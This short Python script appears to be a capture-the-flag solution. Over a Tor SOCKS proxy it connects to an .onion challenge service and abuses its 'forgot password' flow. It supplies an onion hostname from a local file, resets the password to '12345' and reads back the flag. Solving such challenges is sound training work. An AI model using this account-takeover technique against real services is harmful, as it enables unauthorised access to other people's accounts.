import socks

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
s = socks.socksocket()
s.connect(('cnshwjhavr4t2pi5hysmsi2ro22fqnjrvi7hqeoovmwfbrypmm4o4lyd.onion', 8003))

print(s.recv(1024).decode())
s.sendall(b'2\n') #forgot password
print('2\n')

with open('7-3/hostname', 'rb') as file:
    hostname = file.read()

print(s.recv(1024).decode()) # Please provide your onion domain (ends in .onion) :
s.sendall(hostname)
print(hostname + b'\n')

print(s.recv(2048).decode()) # Password reset...menu
print(hostname + b'1\n')
s.sendall(b'1\n')  

print(s.recv(1024).decode()) # Please provide your password :
s.sendall(b"12345\n")  
print("12345\n") # flag
print(s.recv(1024).decode()) # flag
